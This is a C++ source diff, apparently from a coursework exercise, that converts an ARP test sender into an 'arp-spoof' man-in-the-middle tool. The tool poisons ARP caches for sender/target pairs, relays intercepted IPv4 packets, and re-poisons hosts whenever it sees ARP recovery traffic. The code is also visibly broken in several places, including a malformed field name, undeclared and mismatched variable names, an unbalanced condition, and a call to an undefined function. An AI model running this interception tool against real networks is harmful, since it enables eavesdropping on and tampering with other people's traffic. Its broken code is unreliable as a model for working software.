@@ -17,9 +17,16 @@ struct EthArpPacket final {
 };
 #pragma pack(pop)
 
+struct Session final {
+	Ip senderIp_;
+	Mac senderMac_;
+	Ip target Ip_;
+	Mac targetMac_;
+};
+
 void usage() {
-	printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
-	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
+	printf("syntax: arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
+	printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
 }
 
 Mac getMac(const char* iface) {
@@ -45,6 +52,30 @@ Mac getMac(const char* iface) {
 	close(fd);
 	return result;
 }
+
+Ip getIp(const char* interface) {
+	int fd = socket(AF_INET, SOCK_DGRAM, 0);
+	if (fd < 0) {
+		fprintf(stderr, "socket error\n");
+		return Ip("0.0.0.0");
+	}
+
+	struct ifreq ifr;
+	std::memset(&ifr, 0, sizeof(ifr));
+	std::strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
+
+	if (ioctl(fd, SIOCGIFADDR, &ifr) != 0) {
+		fprintf(stderr, "could not get IP\n");
+		close(fd);
+		return Ip("0.0.0.0");
+	}
+
+	const sockaddr_in* address = reinterpret_cast<const sockaddr_in*>(&ifr.ifr_addr);
+	Ip ip(ntohl(address->sin_addr.s_addr));
+	close(fd);
+	return ip;
+}
+	
 
 bool sendArpRequest(
 	pcap_t* pcap,
@@ -82,7 +113,7 @@ bool sendArpRequest(
 	return true;
 }
 
-Mac getSenderMac(
+Mac resolveMac(
 	pcap_t* pcap,
 	const Mac& attackerMac,
 	const Ip& attackerIp,
@@ -153,11 +184,7 @@ Mac getSenderMac(
 		}
 	}
 
-	fprintf(
-		stderr,
-        "could not find MAC\n"
-	);
-
+	fprintf(stderr, "could not find MAC\n");
 	return Mac::nullMac();
 }
 
@@ -198,6 +225,50 @@ bool sendArpInfection(
 	return true;
 }
 
+bool relay(pcap_t* pcap, const u_char* rawPacket, bpf_u_int32 length, const Mac& attackermac, const Session& session) {
+	u_char* packet = new u_char[length];
+	std::memcpy(packet, rawPacket, length);
+
+	EthHdr* eth = reinterpret_cast<EthHdr*>(packet);
+	eth->smac_ = attackerMac;
+	eth->dmac_ = session.targetMac_;
+
+	int result = pcap_sendpacket(handle, packet, length);
+	delete[] packet;
+
+	if (result != 0) {
+		fprintf(stderr, "failed to relay\n");
+		return false;
+	}
+	return true;
+}
+
+bool isRecoveryPacket(
+	const EthArpPacket* packet,
+	const Mac& attackerMac,
+	const Session& session
+) {
+	if (packet->eth_.smac_ == attackerMac)
+		return false;
+
+	uint16_t operation = ntohs(packet->arp_.op_);
+	Ip arpSenderIp(ntohl(packet->arp_.sip_));
+	Ip arpTargetIp(ntohl(packet->arp_.tip_));
+
+	if (operation == ArpHdr::Request) {
+		return (arpSenderIp == session.senderIp_ &&
+				arpTargetIp == session.targetIp_) ||
+			(arpSenderIp == session.targetIp_ &&
+				arpTargetIp == session.senderIp_);
+	}
+
+	return operation == ArpHdr::Reply &&
+		arpSenderIp == session.targetIp_ &&
+		arpTargetIp == session.senderIp_ &&
+		packet->arp_.smac_ != attackerMac;
+}
+
+
 int main(int argc, char* argv[]) {
 	if (argc < 4 || (argc - 2) % 2 != 0) {
 		usage();
@@ -206,15 +277,10 @@ int main(int argc, char* argv[]) {
 
 	char* interface = argv[1];
 	Mac attackerMac = getMac(interface);
+	Ip attackerIp = getIp(interface);
 
-	if (attackerMac.isNull()) {
-		fprintf(stderr, "could not get Attacker MAC\n");
-		return 1;
-	}
-
-	Ip attackerIp(ATTACKER_IP);
-	if (attackerIp == Ip("0.0.0.0")) {
-		fprintf(stderr, "set ATTACKER_IP in main.cpp before running\n");
+	if (attackerMac.isNull()| attackerIp == Ip("0.0.0.0") {
+		fprintf(stderr, "could not get Attacker information\n");
 		return 1;
 	}
 
@@ -233,40 +299,91 @@ int main(int argc, char* argv[]) {
 	}
 
 	bool allSucceeded = true;
+	
+	int sessionCount = (argc - 2) / 2;
+	Session* sessions = new Session[sessionCount];
 
-	for (int i = 2; i < argc; i += 2) {
-		Ip senderIp(argv[i]);
-		Ip targetIp(argv[i + 1]);
+	for (int i = 0; i < sessionCount; ++i) { // 추가/변경
+		sessions[i].senderIp_ = Ip(argv[i * 2 + 2]); // 추가/변경
+		sessions[i].targetIp_ = Ip(argv[i * 2 + 3]); // 추가/변경
 
-		Mac senderMac = getSenderMac(
-			pcap,
-			attackerMac,
-			attackerIp,
-			senderIp
-		);
+		sessions[i].senderMac_ = resolveMac( // 추가/변경
+			handle, attackerMac, attackerIp, sessions[i].senderIp_); // 추가/변경
+		sessions[i].targetMac_ = resolveMac( // 추가/변경
+			handle, attackerMac, attackerIp, sessions[i].targetIp_); // 추가/변경
 
-		if (senderMac.isNull()) {
-			fprintf(
-				stderr,
-                "failed to get Sender MAC\n"
-			);
-			allSucceeded = false;
+		if (sessions[i].senderMac_.isNull() || // 추가/변경
+			sessions[i].targetMac_.isNull()) { // 추가/변경
+			delete[] sessions; // 추가/변경
+			pcap_close(handle); // 추가/변경
+			return 1; // 추가/변경
+		} // 추가/변경
+	}
+
+	for (int i = 0; i < sessionCount; ++i) { // 추가/변경
+		if (!infect(handle, attackerMac, sessions[i])) { // 추가/변경
+			delete[] sessions; // 추가/변경
+			pcap_close(handle); // 추가/변경
+			return 1; // 추가/변경
+		} // 추가/변경
+	}
+
+
+	while (true) { // 추가/변경
+		struct pcap_pkthdr* header; // 추가/변경
+		const u_char* rawPacket; // 추가/변경
+		int result = pcap_next_ex(handle, &header, &rawPacket); // 추가/변경
+
+		if (result == -1) { // 추가/변경
+			fprintf(stderr, "pcap_next_ex failed: %s\n", pcap_geterr(handle)); // 추가/변경
+			break; // 추가/변경
+		} // 추가/변경
+		if (result == -2) // 추가/변경
+			break; // 추가/변경
+
+		if (result == 0) // 추가/변경
+			continue; // 추가/변경
+		if (header->caplen < sizeof(EthHdr)) // 추가/변경
+			continue; // 추가/변경
+
+		const EthHdr* eth = reinterpret_cast<const EthHdr*>(rawPacket); // 추가/변경
+		uint16_t etherType = ntohs(eth->type_); // 추가/변경
+
+		if (etherType == EthHdr::Ip4) { // 추가/변경
+			if (header->caplen != header->len) // 추가/변경
+				continue; // 추가/변경
+
+			for (int i = 0; i < sessionCount; ++i) { // 추가/변경
+				if (eth->smac_ == sessions[i].senderMac_ && // 추가/변경
+					eth->dmac_ == attackerMac) { // 추가/변경
+					relay(handle, rawPacket, header->caplen, // 추가/변경
+						attackerMac, sessions[i]); // 추가/변경
+					break; // 추가/변경
+				} // 추가/변경
+			} // 추가/변경
 			continue;
 		}
 
+		if (etherType != EthHdr::Arp || // 추가/변경
+			header->caplen < sizeof(EthArpPacket)) // 추가/변경
+			continue; // 추가/변경
 
+		const EthArpPacket* arpPacket = // 추가/변경
+			reinterpret_cast<const EthArpPacket*>(rawPacket); // 추가/변경
 
-		if (!sendArpInfection(
-				pcap,
-				attackerMac,
-				senderMac,
-				senderIp,
-				targetIp)) {
-			allSucceeded = false;
+		if (ntohs(arpPacket->arp_.hrd_) != ArpHdr::ETHER || // 추가/변경
+			ntohs(arpPacket->arp_.pro_) != EthHdr::Ip4 || // 추가/변경
+			arpPacket->arp_.hln_ != Mac::Size || // 추가/변경
+			arpPacket->arp_.pln_ != Ip::Size)
 			continue;
+
+		for (int i = 0; i < sessionCount; ++i) {
+			if (isRecoveryPacket(arpPacket, attackerMac, sessions[i]))
+				infect(handle, attackerMac, sessions[i]); 	
 		}
 	}
 
+	delete[] sessions;
 	pcap_close(pcap);
 	return allSucceeded ? 0 : 1;
 }
